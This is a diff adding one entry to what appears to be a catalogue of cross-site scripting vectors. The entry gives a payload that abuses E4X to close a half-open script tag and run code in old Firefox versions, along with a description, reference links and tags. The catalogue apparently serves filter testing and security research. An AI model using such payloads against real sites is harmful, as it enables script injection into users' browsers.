@@ -2342,5 +2342,34 @@ var items =
         },
         'tags'       : ['xss', 'javascript', 'event-source', 'opera', 'sse'],
         'reporter'   : '.mario'
-    }   
+    },
+    { /* ID 75 - E4X used to close an opening <SCRIPT> tag and {} evaluation */
+        'id'         : 75,
+        'category'   : 'e4x', 
+        'name'       : {
+            'en' : 'E4X used to close an opening <SCRIPT> tag and {} evaluation',
+            'ja' : '',
+            'ru' : '',
+            'de' : ''
+        },
+        'data'       : '<script<{alert(1)}/></script </>',
+        'description': {
+            'en' : 'In this example an E4X object is being used to close a half-open <SCRIPT> tag and evaluate code in the global scope afterwards via the E4X curly bracket delimiters.',
+            'ja' : '',
+            'ru' : '',
+            'de' : ''
+        },
+        'urls'    : ['https://developer.mozilla.org/en/E4X', 'https://bugzilla.mozilla.org/show_bug.cgi?id=564706'],
+        'howtofix'   : {
+            'en' : '',
+            'ja' : '',
+            'ru' : '',
+            'de' : ''
+        },                        
+        'browsers'   : {
+            'firefox': ['1.5', '2.x', '3.x'],
+        },
+        'tags'       : ['xss', 'javascript', 'e4x', 'script', 'parser', 'regex'],
+        'reporter'   : '.mario, Gareth'
+    },
 ]
